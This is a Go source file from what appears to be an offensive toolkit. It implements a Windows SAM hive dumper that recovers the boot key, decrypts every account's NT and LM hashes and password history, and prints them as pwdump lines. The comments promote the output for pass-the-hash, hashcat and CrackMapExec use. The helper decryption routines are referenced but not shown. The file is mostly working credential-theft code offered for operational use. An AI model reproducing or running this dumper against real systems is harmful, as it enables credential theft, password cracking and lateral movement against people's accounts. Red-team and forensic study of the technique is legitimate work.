package samdump

import (
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"strings"
)

// Account is one user record decrypted from the SAM hive. RID is the
// account's relative identifier (numeric component of the SID); LM
// and NT are the 16-byte hash bytes (nil when the corresponding hash
// type is empty in the database). Username is decoded from the V
// value's UTF-16 username region.
//
// NTHistory / LMHistory carry the per-account password-history
// hashes, ordered most-recent-first as Windows stores them. Empty
// (nil or zero length) when the account has no history (fresh
// install) or when the host has `PasswordHistorySize=0`. On modern
// builds (Win10 1607+) LM hashing is disabled by default — expect
// LMHistory to be nil for every account on a current host.
//
// Operationally: history hashes are full pass-the-hash candidates.
// Each one was the user's NT hash at some past point in time; stale
// passwords often persist on adjacent systems that haven't been
// re-imaged, and many domains reuse a small set of patterns
// ("Spring2024!", "Spring2025!", …) the history exposes verbatim.
//
// Pwdump renders Account as the canonical secretsdump line:
//
//	username:RID:LM_HEX:NT_HEX:::
//
// PwdumpHistory renders one extra line per historical hash, suffixed
// with `_history0`, `_history1`, … so hashcat / John consume them
// alongside the current hash as additional candidates.
//
// Tooling that consumes pwdump (hashcat -m 1000, John --format=NT,
// CrackMapExec NTLM hash auth) accepts this layout directly.
type Account struct {
	Username  string
	RID       uint32
	LM        []byte
	NT        []byte
	NTHistory [][]byte
	LMHistory [][]byte
}

// Pwdump returns the canonical pwdump line for a, with empty/missing
// hashes rendered as the all-zeros (LM/NT inactive) sentinel. The
// trailing ":::" is part of the spec.
func (a Account) Pwdump() string {
	const inactive = "00000000000000000000000000000000"
	lm := inactive
	nt := inactive
	if len(a.LM) == 16 {
		lm = hex.EncodeToString(a.LM)
	}
	if len(a.NT) == 16 {
		nt = hex.EncodeToString(a.NT)
	}
	return fmt.Sprintf("%s:%d:%s:%s:::", a.Username, a.RID, lm, nt)
}

// PwdumpHistory renders one pwdump line per historical hash slot,
// using the impacket secretsdump convention: the username is
// suffixed with `_history0`, `_history1`, … (index 0 = most recent
// historical hash, NOT the current one — that's [Pwdump]). NT and
// LM history are zipped index-by-index; missing slots on either
// side render as the inactive sentinel. Returns the empty string
// when both history slices are empty.
//
// Operators feed this output straight into hashcat / John alongside
// the current-hash pwdump line — every historical hash is a
// pass-the-hash candidate against any host that hasn't enforced
// rotation.
func (a Account) PwdumpHistory() string {
	const inactive = "00000000000000000000000000000000"
	n := len(a.NTHistory)
	if len(a.LMHistory) > n {
		n = len(a.LMHistory)
	}
	if n == 0 {
		return ""
	}
	var sb strings.Builder
	for i := 0; i < n; i++ {
		nt := inactive
		lm := inactive
		if i < len(a.NTHistory) && len(a.NTHistory[i]) == 16 {
			nt = hex.EncodeToString(a.NTHistory[i])
		}
		if i < len(a.LMHistory) && len(a.LMHistory[i]) == 16 {
			lm = hex.EncodeToString(a.LMHistory[i])
		}
		fmt.Fprintf(&sb, "%s_history%d:%d:%s:%s:::\n", a.Username, i, a.RID, lm, nt)
	}
	return sb.String()
}

// ErrDump is returned when Dump can't complete — bad hive, missing
// boot/domain key, no users found, or a per-user decrypt step fails.
// Per-user warnings are accumulated on Result.Warnings rather than
// aborting the whole dump.
var ErrDump = errors.New("samdump: dump failed")

// Result aggregates the output of a successful Dump. Accounts is the
// per-user credentials list. Warnings carries non-fatal anomalies
// (single-user parse failures, missing optional fields) so the
// operator can audit incomplete dumps without losing the rest.
type Result struct {
	Accounts []Account
	Warnings []string
}

// Pwdump renders r as a multi-line pwdump file (one Account per
// line). Iteration order matches Accounts (insertion order from
// Dump = ascending RID).
func (r Result) Pwdump() string {
	var sb strings.Builder
	for i := range r.Accounts {
		sb.WriteString(r.Accounts[i].Pwdump())
		sb.WriteByte('\n')
	}
	return sb.String()
}

// PwdumpWithHistory renders r as Pwdump does, then appends every
// account's PwdumpHistory directly under its current-hash line.
// Output shape per account:
//
//	alice:1001:LM:NT:::
//	alice_history0:1001:LM:NT:::
//	alice_history1:1001:LM:NT:::
//	bob:1002:LM:NT:::
//	...
//
// Use this when you want hashcat / John to attempt every hash a
// user has ever held — current + history — in one pass.
func (r Result) PwdumpWithHistory() string {
	var sb strings.Builder
	for i := range r.Accounts {
		sb.WriteString(r.Accounts[i].Pwdump())
		sb.WriteByte('\n')
		sb.WriteString(r.Accounts[i].PwdumpHistory())
	}
	return sb.String()
}

// Dump returns the per-user credentials in the SAM hive at samHive,
// using the SYSTEM hive at systemHive to recover the boot key and
// per-domain hashed bootkey. Both readers must support ReadAt over
// the entire hive bytes; samdump loads each hive into memory once.
//
// Algorithm:
//
//   1. SYSTEM hive → extract 16-byte boot key (extractBootKey).
//   2. SAM hive → read SAM\Domains\Account\F → derive domain hashed
//      bootkey (deriveDomainKey, AES or legacy by revision tag).
//   3. SAM hive → enumerate SAM\Domains\Account\Users\<RID>
//      subkeys, parse each user's V value (parseUserV) and decrypt
//      the NT + LM hash blobs (decryptUserNT / decryptUserLM).
//
// Per-user failures collect on Result.Warnings; only structural
// failures (missing boot key, malformed F value, no Users key)
// abort with ErrDump.
func Dump(systemHive io.ReaderAt, systemSize int64, samHive io.ReaderAt, samSize int64) (Result, error) {
	system, err := readHive(systemHive, systemSize)
	if err != nil {
		return Result{}, errors.Join(ErrDump, fmt.Errorf("read SYSTEM hive: %w", err))
	}
	sam, err := readHive(samHive, samSize)
	if err != nil {
		return Result{}, errors.Join(ErrDump, fmt.Errorf("read SAM hive: %w", err))
	}

	bootkey, err := extractBootKey(system)
	if err != nil {
		return Result{}, errors.Join(ErrDump, err)
	}

	fValue, err := readDomainAccountF(sam)
	if err != nil {
		return Result{}, errors.Join(ErrDump, err)
	}
	hashedBootkey, err := deriveDomainKey(bootkey, fValue)
	if err != nil {
		return Result{}, errors.Join(ErrDump, err)
	}

	rids, err := listUserRIDs(sam)
	if err != nil {
		return Result{}, errors.Join(ErrDump, err)
	}
	res := Result{}
	for _, rid := range rids {
		v, err := readUserV(sam, rid)
		if err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d: read V: %v", rid, err))
			continue
		}
		parsed, err := parseUserV(v)
		if err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d: parse V: %v", rid, err))
			continue
		}
		acct := Account{
			Username: parsed.Username,
			RID:      rid,
		}
		if nt, err := decryptUserNT(hashedBootkey, rid, parsed.NTHashEnc); err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d (%s): NT decrypt: %v", rid, parsed.Username, err))
		} else {
			acct.NT = nt
		}
		if lm, err := decryptUserLM(hashedBootkey, rid, parsed.LMHashEnc); err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d (%s): LM decrypt: %v", rid, parsed.Username, err))
		} else {
			acct.LM = lm
		}
		// History decryption is best-effort: a malformed or truncated
		// history blob is operator-visible noise, not a fatal dump
		// error. The current-hash line still ships; missing history
		// is recorded as a warning so callers know to investigate.
		if hist, err := decryptUserNTHistory(hashedBootkey, rid, parsed.NTHistoryEnc); err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d (%s): NT history decrypt: %v", rid, parsed.Username, err))
		} else {
			acct.NTHistory = hist
		}
		if hist, err := decryptUserLMHistory(hashedBootkey, rid, parsed.LMHistoryEnc); err != nil {
			res.Warnings = append(res.Warnings,
				fmt.Sprintf("RID %d (%s): LM history decrypt: %v", rid, parsed.Username, err))
		} else {
			acct.LMHistory = hist
		}
		res.Accounts = append(res.Accounts, acct)
	}
	return res, nil
}
